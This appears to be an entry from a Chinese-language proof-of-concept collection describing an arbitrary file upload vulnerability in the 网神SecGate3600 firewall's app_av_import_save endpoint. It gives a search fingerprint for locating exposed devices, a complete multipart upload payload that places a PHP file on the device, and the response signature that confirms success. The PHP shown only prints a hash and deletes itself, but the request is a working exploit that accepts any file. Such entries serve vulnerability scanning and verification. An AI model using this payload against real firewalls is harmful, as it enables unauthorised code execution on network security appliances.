# 网神SecGate3600防火墙app_av_import_save任意文件上传漏洞

网神SecGate3600防火墙app_av_import_save ｜ 文件上传 ｜ —
- **指纹**：`title="网神SecGate 3600防火墙"`
- **请求**：`POST / HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"
10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="reqfile";filename="dudesuite.php"
Content-Type: text/plain
<?php echo(md5(13123));unlink(__FILE__);?>
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"
app_av_import_save
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```
- **响应特征**：-1 274da997412973c08cf7e78724153f55